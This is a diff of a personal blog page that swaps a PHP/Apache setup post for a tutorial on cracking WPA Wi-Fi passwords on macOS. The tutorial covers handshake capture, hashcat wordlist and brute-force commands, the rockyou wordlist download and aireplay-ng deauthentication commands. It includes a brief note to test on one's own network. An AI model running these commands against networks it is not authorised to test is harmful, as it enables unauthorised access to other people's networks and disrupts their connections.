@@ -4,20 +4,19 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>PHP | Zachary&#39;s blog</title>
+  <title>Wifi Cracker in Mac OS X | Zachary&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ApacheStart Apache: sudo apachectl start Stop Apache: sudo apachectl stop Restart Apache: sudo apachectl restart  Open PHPTo open PHP, need to modify the following config file 1sudo vim /etc/apache2/h">
-<meta name="keywords" content="Apache,PHP,Ubuntu">
+  <meta name="description" content="Mac OS X comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click “Open Wireless Diagnostics…” a">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP">
-<meta property="og:url" content="http://dontcry2013.github.io/blog/2016/04/29/php/index.html">
+<meta property="og:title" content="Wifi Cracker in Mac OS X">
+<meta property="og:url" content="http://dontcry2013.github.io/blog/2020/01/12/wifi-cracker/index.html">
 <meta property="og:site_name" content="Zachary&#39;s blog">
-<meta property="og:description" content="ApacheStart Apache: sudo apachectl start Stop Apache: sudo apachectl stop Restart Apache: sudo apachectl restart  Open PHPTo open PHP, need to modify the following config file 1sudo vim /etc/apache2/h">
+<meta property="og:description" content="Mac OS X comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click “Open Wireless Diagnostics…” a">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-12-18T12:38:22.542Z">
+<meta property="og:updated_time" content="2020-01-12T12:24:21.415Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP">
-<meta name="twitter:description" content="ApacheStart Apache: sudo apachectl start Stop Apache: sudo apachectl stop Restart Apache: sudo apachectl restart  Open PHPTo open PHP, need to modify the following config file 1sudo vim /etc/apache2/h">
+<meta name="twitter:title" content="Wifi Cracker in Mac OS X">
+<meta name="twitter:description" content="Mac OS X comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click “Open Wireless Diagnostics…” a">
   
     <link rel="alternative" href="/atom.xml" title="Zachary&#39;s blog" type="application/atom+xml">
   
@@ -198,11 +197,11 @@ var _hmt = _hmt || [];
 	</div>
 </nav>
 
-      <div class="body-wrap"><article id="post-php" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-wifi-cracker" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/blog/2016/04/29/php/" class="article-date">
-  	<time datetime="2016-04-29T08:34:12.000Z" itemprop="datePublished">2016-04-29</time>
+      <a href="/blog/2020/01/12/wifi-cracker/" class="article-date">
+  	<time datetime="2020-01-12T12:04:34.000Z" itemprop="datePublished">2020-01-12</time>
 </a>
     </div>
   
@@ -215,7 +214,7 @@ var _hmt = _hmt || [];
         
   
     <h1 class="article-title" itemprop="name">
-      PHP
+      Wifi Cracker in Mac OS X
     </h1>
   
 
@@ -223,15 +222,7 @@ var _hmt = _hmt || [];
       
       <div class="article-info article-info-post">
         
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/apache/">Apache</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/php/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/ubuntu/">Ubuntu</a></li></ul>
-	</div>
-
         
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/blog/categories/basic/">Basic</a>
-	</div>
-
 
         <div class="clearfix"></div>
       </div>
@@ -239,18 +230,29 @@ var _hmt = _hmt || [];
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p>Start Apache: <strong><code>sudo apachectl start</code></strong></p>
-<p>Stop Apache: <strong><code>sudo apachectl stop</code></strong></p>
-<p>Restart Apache: <strong><code>sudo apachectl restart</code></strong></p>
-<hr>
-<h1 id="Open-PHP"><a href="#Open-PHP" class="headerlink" title="Open PHP"></a>Open PHP</h1><p>To open PHP, need to modify the following config file</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure>
-<p>Find the line <strong><code>#LoadModule php5_module libexec/apache2/libphp5.so</code></strong>, remote the <strong><code>#</code></strong> sign.</p>
-<p>In mac, the default Apache directory is <strong><code>/Library/WebServer/Documents</code></strong>, create a file named <strong><code>index.php</code></strong>, if it’s not exist, write <strong><code>&lt;?php phpinfo(); ?&gt;</code></strong> as the first line. Open browser to access localhost, if the PHP info page displayed, that means PHP is configured to open successfully.</p>
-<h1 id="Change-Apache-Default-Directory"><a href="#Change-Apache-Default-Directory" class="headerlink" title="Change Apache Default Directory"></a>Change Apache Default Directory</h1><p>　　上面说到了mac下Apache的默认文件夹为/Library/WebServer/Documents，该目录默认是隐藏的，操作不是很方便，我们可以将其修改成自定义的目录。</p>
-<p>Open terminal and input: <strong><code>sudo vim /etc/apache2/httpd.conf</code></strong></p>
-<p>Find the following lines<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentRoot &quot;/Library/WebServer/Documents&quot;</span><br><span class="line">&lt;Directory &quot;/Library/WebServer/Documents&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>Replace the directory with you preferred one, restart Apache, move the just created <strong><code>index.php</code></strong> to the directory, and then test in the browser to see if the php info page still working.</p>
+        <p>Mac OS X comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click “Open Wireless Diagnostics…” and then click on Window &gt; Scan. Find the target network, note its channel and width.</p>
+<h1 id="Capture-a-4-way-Handshake"><a href="#Capture-a-4-way-Handshake" class="headerlink" title="Capture a 4-way Handshake"></a>Capture a 4-way Handshake</h1><p>With Wireless Diagnostics open, click on Window &gt; Sniffer. Select the channel and width that you found in the previous step.<br>Now you’ll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.<br>Once you think you’ve got a handshake, click Stop.<br>The .wcap capture file will either be saved to your Desktop or /var/tmp/ depending on your operating system version.<br>Convert the capture file to .hccapx by uploading it to <a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">https://hashcat.net/cap2hccapx/</a>. If you captured any handshakes, the site will start downloading a .hccapx file. No download will be prompted if you did not.</p>
+<a id="more"></a>
+<ul>
+<li>With Wireless Diagnostics open, click on Window &gt; Sniffer. Select the channel and width that you found in the previous step.</li>
+<li>Now you’ll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.</li>
+<li>Once you think you’ve got a handshake, click Stop.<br>The .pcap capture file will either be saved to your Desktop or /var/tmp/ depending on your operating system version.</li>
+<li>Convert the capture file to .hccapx by using <a href="https://github.com/hashcat/hashcat-utils" target="_blank" rel="noopener">https://github.com/hashcat/hashcat-utils</a> in src folder compile to bin.</li>
+</ul>
+<p><code>gcc -o cap2hccapx cap2hccapx.c&quot; and then run it: &quot;./cap2hccapx&quot;</code></p>
+<h1 id="Crack-the-password-with-hashcat"><a href="#Crack-the-password-with-hashcat" class="headerlink" title="Crack the password with hashcat"></a>Crack the password with hashcat</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew install hashcat</span><br><span class="line">hashcat -m 2500 capture.hccapx wordlist.txt</span><br><span class="line"># or brute force</span><br><span class="line">hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
+<h1 id="Wordlist-Download-the-134MB-rockyou-dictionary-file"><a href="#Wordlist-Download-the-134MB-rockyou-dictionary-file" class="headerlink" title="Wordlist - Download the 134MB rockyou dictionary file"></a>Wordlist - Download the 134MB rockyou dictionary file</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>Other bigger candidates: </p>
+<ul>
+<li><a href="https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length" target="_blank" rel="noopener">https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length</a></li>
+<li><a href="https://xa.to/10m" target="_blank" rel="noopener">https://xa.to/10m</a></li>
+</ul>
+<h1 id="Deauth-Attack"><a href="#Deauth-Attack" class="headerlink" title="Deauth Attack"></a>Deauth Attack</h1><h2 id="Get-deauth-Tool"><a href="#Get-deauth-Tool" class="headerlink" title="Get deauth Tool"></a>Get deauth Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install aircrack-ng</span><br></pre></td></tr></table></figure>
+<p>Find <code>aireplay-ng</code> in sbin.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># -0 2 specifies we would like to send 2 deauth packets. Increase this number</span><br><span class="line"># if need be with the risk of noticeably interrupting client network activity</span><br><span class="line"># -a is the MAC of the access point</span><br><span class="line"># -c is the MAC of the client</span><br><span class="line">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0</span><br></pre></td></tr></table></figure>
+<p>You can optionally broadcast deauth packets to all connected clients with:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># not all clients respect broadcast deauths though</span><br><span class="line">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0</span><br></pre></td></tr></table></figure></p>
+<p>reference:</p>
+<p><a href="https://github.com/brannondorsey/wifi-cracking" target="_blank" rel="noopener">https://github.com/brannondorsey/wifi-cracking</a><br><a href="https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html" target="_blank" rel="noopener">https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html</a></p>
 
       
     </div>
@@ -260,18 +262,9 @@ var _hmt = _hmt || [];
     
 <nav id="article-nav">
   
-    <a href="/blog/2016/05/18/ocr-application-mk/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          application-mk
-        
-      </div>
-    </a>
   
-  
-    <a href="/blog/2016/04/29/pointer/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">函数指针和指针函数</div>
+    <a href="/blog/2020/01/09/nginx/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">nginx</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -306,7 +299,7 @@ var _hmt = _hmt || [];
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="php" data-title="PHP" data-url="http://dontcry2013.github.io/blog/blog/2016/04/29/php/"></div>
+	<div class="ds-thread" data-thread-key="wifi-cracker" data-title="Wifi Cracker in Mac OS X" data-url="http://dontcry2013.github.io/blog/blog/2020/01/12/wifi-cracker/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
